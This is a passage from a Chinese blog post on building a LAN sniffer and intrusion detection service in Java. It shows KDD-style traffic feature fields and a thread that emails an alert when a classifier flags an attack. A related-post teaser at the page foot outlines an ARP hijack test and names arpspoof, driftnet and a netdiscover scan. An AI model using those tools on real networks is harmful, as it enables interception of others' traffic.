<span class="c1">//前100个连接中，与当前连接具有相同目标主机相同服务的连接所占的百分比，连续，[0.00, 1.00]。</span>
<span class="kd">private</span> <span class="kt">double</span> <span class="n">dst_host_same_srv_rate</span><span class="o">;</span>
<span class="c1">//前100个连接中，与当前连接具有相同目标主机不同服务的连接所占的百分比，连续，[0.00, 1.00]。</span>
<span class="kd">private</span> <span class="kt">double</span> <span class="n">dst_host_diff_srv_rate</span><span class="o">;</span>
<span class="c1">//前100个连接中，与当前连接具有相同目标主机相同源端口的连接所占的百分比，连续，[0.00, 1.00]。</span>
<span class="kd">private</span> <span class="kt">double</span> <span class="n">dst_host_same_src_port_rate</span><span class="o">;</span>
<span class="c1">//前100个连接中，与当前连接具有相同目标主机相同服务的连接中，与当前连接具有不同源主机的连接所占的百分比，连续，[0.00, 1.00]。</span>
<span class="kd">private</span> <span class="kt">double</span> <span class="n">dst_host_srv_diff_host_rate</span><span class="o">;</span>
<span class="c1">//前100个连接中，与当前连接具有相同目标主机的连接中，出现SYN错误的连接所占的百分比，连续，[0.00, 1.00]。</span>
<span class="kd">private</span> <span class="kt">double</span> <span class="n">dst_host_serror_rate</span><span class="o">;</span>
<span class="c1">//前100个连接中，与当前连接具有相同目标主机相同服务的连接中，出现SYN错误的连接所占的百分比，连续，[0.00, 1.00]。</span>
<span class="kd">private</span> <span class="kt">double</span> <span class="n">dst_host_srv_serror_rate</span><span class="o">;</span>
<span class="c1">//前100个连接中，与当前连接具有相同目标主机的连接中，出现REJ错误的连接所占的百分比，连续，[0.00, 1.00]。</span>
<span class="kd">private</span> <span class="kt">double</span> <span class="n">dst_host_rerror_rate</span><span class="o">;</span>
<span class="c1">//前100个连接中，与当前连接具有相同目标主机相同服务的连接中，出现REJ错误的连接所占的百分比，连续，[0.00, 1.00]。</span>
<span class="kd">private</span> <span class="kt">double</span> <span class="n">dst_host_srv_rerror_rate</span><span class="o">;</span>
</pre></table></code></div></div><p>该数据集共有41个特征，大致可分为以下四类：</p><ol><li>TCP连接基本特征</li><li>TCP连接内容特征</li><li>基于时间的网络流量统计特征</li><li>基于主机的网络流量统计特征</li></ol><p>然后在mysql数据库中创建一张Features表，对应着<code class="language-plaintext highlighter-rouge">Features</code>类。同时编写查询的dao操作，这里省略了，代码见<code class="language-plaintext highlighter-rouge">backend</code>模块的dao包和resources包。</p><p>至此，基本的框架已经搭建完成，如下：</p><ol><li>微服务会用到的pojo、utils、interfaces、exceptions都放到了api模块中，在其他微服务模块中添加api的依赖。</li><li>在backend模块中抓包并分析，最后封装为features存入mysql。（实际上这步应当放到analyze-service中）</li><li>在ids-service-provider模块中实现入侵检测，从mysql中拉取数据，再通过训练好的j48tree分类器进行分类。</li><li>ids服务依据分类器分类结果选择是否调用mail服务发送邮件告警。</li></ol><p>最后在backend模块中实现：在web容器初始化的时候，开启一条低优先级的线程<code class="language-plaintext highlighter-rouge">IDSThread</code>，每间隔10秒查询一次数据库，根据模型的分类结果调用邮件服务：</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">com.hyc.backend.thread</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">com.hyc.dto.MailDto</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.hyc.interfaces.IIDSService</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.hyc.interfaces.IMailService</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.dubbo.config.annotation.Reference</span><span class="o">;</span>

<span class="cm">/**
 * @author kol Huang
 * @date 2021/4/13
 */</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">IDSThread</span> <span class="kd">extends</span> <span class="nc">Thread</span><span class="o">{</span>

  <span class="nd">@Reference</span>
  <span class="kd">private</span> <span class="nc">IIDSService</span> <span class="n">idsService</span><span class="o">;</span>

  <span class="nd">@Reference</span>
  <span class="kd">private</span> <span class="nc">IMailService</span> <span class="n">mailService</span><span class="o">;</span>

  <span class="kd">public</span> <span class="nf">IDSThread</span><span class="o">(</span><span class="kt">int</span> <span class="n">priority</span><span class="o">){</span>
    <span class="k">if</span><span class="o">(</span><span class="n">priority</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="o">)</span>    <span class="n">priority</span> <span class="o">=</span> <span class="mi">1</span><span class="o">;</span>
    <span class="k">if</span><span class="o">(</span><span class="n">priority</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="o">)</span>   <span class="n">priority</span> <span class="o">=</span> <span class="mi">10</span><span class="o">;</span>
    <span class="n">setPriority</span><span class="o">(</span><span class="n">priority</span><span class="o">);</span>
  <span class="o">}</span>

  <span class="nd">@Override</span>
  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
    <span class="kt">boolean</span> <span class="n">res</span> <span class="o">=</span> <span class="n">idsService</span><span class="o">.</span><span class="na">isAttacked</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">res</span><span class="o">){</span>
      <span class="nc">String</span> <span class="n">subject</span> <span class="o">=</span> <span class="s">"alert!"</span><span class="o">;</span>
      <span class="nc">String</span> <span class="n">content</span> <span class="o">=</span> <span class="s">"Your server may under attack!"</span><span class="o">;</span>
      <span class="nc">String</span><span class="o">[]</span> <span class="n">tos</span> <span class="o">=</span> <span class="o">{</span><span class="s">"xxxx@xx.com"</span><span class="o">};</span>
      <span class="nc">MailDto</span> <span class="n">dto</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MailDto</span><span class="o">(</span><span class="n">subject</span><span class="o">,</span> <span class="n">content</span><span class="o">,</span> <span class="n">tos</span><span class="o">);</span>
      <span class="n">mailService</span><span class="o">.</span><span class="na">sendMail</span><span class="o">(</span><span class="n">dto</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="nc">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">10000</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">com.hyc.backend.service</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">com.hyc.backend.thread.IDSThread</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.hyc.interfaces.IIDSService</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.dubbo.config.annotation.Reference</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.annotation.PostConstruct</span><span class="o">;</span>


<span class="cm">/**
 * 入侵检测服务：独立出来成为微服务
 * @author kol Huang
 * @date 2021/4/7
 */</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">IDSService</span> <span class="o">{</span>
  <span class="c1">//当被判别为异常的数据包个数超过100个，就进入告警</span>
  <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">Long</span> <span class="no">THRESHOLD</span> <span class="o">=</span> <span class="mi">100L</span><span class="o">;</span>
  <span class="nd">@Reference</span>
  <span class="nc">IIDSService</span> <span class="n">idsService</span><span class="o">;</span>

  <span class="nd">@PostConstruct</span>
  <span class="kt">void</span> <span class="nf">initIDSService</span><span class="o">(){</span>
    <span class="c1">//在初始化web项目的时候，就开启一条低优先级的线程，间隔10秒钟向数据库发起一段查询</span>
    <span class="k">new</span> <span class="nf">IDSThread</span><span class="o">(</span><span class="mi">2</span><span class="o">).</span><span class="na">start</span><span class="o">();</span>
  <span class="o">}</span>
<span class="o">}</span>

</pre></table></code></div></div><h2 id="8-总结">8. 总结</h2></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/blogging/'>Blogging</a>, <a href='/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/'>内网渗透</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/security/" class="post-tag no-text-decoration" >security</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=局域网嗅探器与IDS - 银杏叶&url=www.yucaihuang.com/posts/simple-lan-sniffer/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=局域网嗅探器与IDS - 银杏叶&u=www.yucaihuang.com/posts/simple-lan-sniffer/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=局域网嗅探器与IDS - 银杏叶&url=www.yucaihuang.com/posts/simple-lan-sniffer/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/web-url-with-chinese-string/">URL包含中文，请求资源404</a></li><li><a href="/posts/web-docker_2/">Docker：入门</a></li><li><a href="/posts/web-docker_1/">Docker：概述</a></li><li><a href="/posts/web-delete-system-python-in-centos/">centOS误删系统自带python</a></li><li><a href="/posts/springboot-starter-id/">创建自定义Springboot starter</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/%E7%AE%97%E6%B3%95%E9%A2%98%E8%A7%A3/">算法题解</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/java%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/">Java源码学习</a> <a class="post-tag" href="/tags/jvm/">jvm</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/security/">security</a> <a class="post-tag" href="/tags/algorithms/">Algorithms</a> <a class="post-tag" href="/tags/redis/">redis</a> <a class="post-tag" href="/tags/concurrency/">concurrency</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/security-arp-hijack/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Aug 25, 2020 <i class="unloaded">2020-08-25T20:40:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>内网渗透：记一次局域网arp劫持测试</h3><div class="text-muted small"><p> 攻击前准备： 一台Kali虚拟机作为attacker 一台win7虚拟机作为victim win7虚拟机开桥接模式，模拟以太网连接。 用到的主要命令： arpspoof driftnet Step1：扫描局域网内主机 netdiscover -r 192.168.199.0/24 #...</p></div></div></a></div><div class="card"> <a href="/posts/spring-iocdoc-read/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Mar 6 <i class="unloaded">2021-03-06T10:47:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Spring IOC技术文档阅读笔记</h3><div class="text-muted small"><p> 1. The IoC Container The org.springframework.beans and org.springframework.context packages are the basis for Spring Framework’s IoC container. 这两个包是Spring框架IoC容器的基础 The BeanFactory interface pr...</p></div></div></a></div><div class="card"> <a href="/posts/spring-ioc-analyze/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Mar 6 <i class="unloaded">2021-03-06T13:14:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Spring IOC原理总结</h3><div class="text-muted small"><p> 转载自：https://zhuanlan.zhihu.com/p/29344811 Spring容器高层视图 Spring 启动时读取应用程序提供的Bean配置信息，并在Spring容器中生成一份相应的Bean配置注册表，然后根据这张注册表实例化Bean，装配好Bean之间的依赖关系，为上层应用提供准备就绪的运行环境。 Bean缓存池：HashMap实现 IOC容器介绍 Spr...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/java-concurrenthashmap/" class="btn btn-outline-primary"><p>Java源码分析之ConcurrentHashMap</p></a> <a href="/posts/leetcode-evaluate-notation/" class="btn btn-outline-primary"><p>leetcode：表达式求值总结</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><p class="footer-center"> © 2021 <a href="">Yucai Huang</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span> <br> <a href="https://beian.miit.gov.cn/" target="_blank">浙ICP备2020032055号-1</a></p></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/%E7%AE%97%E6%B3%95%E9%A2%98%E8%A7%A3/">算法题解</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/java%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/">Java源码学习</a> <a class="post-tag" href="/tags/jvm/">jvm</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/security/">security</a> <a class="post-tag" href="/tags/algorithms/">Algorithms</a> <a class="post-tag" href="/tags/redis/">redis</a> <a class="post-tag" href="/tags/concurrency/">concurrency</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-176388509-1', 'auto'); ga('send', 'pageview'); </script> <script> (function(e,t,n,i,s,a,c){e[n]=e[n]||function(){(e[n].q=e[n].q||[]).push(arguments)} ;a=t.createElement(i);c=t.getElementsByTagName(i)[0];a.async=true;a.src=s ;c.parentNode.insertBefore(a,c) })(window,document,"galite","script","https://cdn.jsdelivr.net/npm/ga-lite@2/dist/ga-lite.min.js"); galite('create', '{"id"=>"UA-176388509-1", "pv"=>{"enabled"=>false, "proxy_url"=>"", "proxy_endpoint"=>"", "cache"=>true}}', 'auto'); galite('send', 'pageview'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="www.yucaihuang.com{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
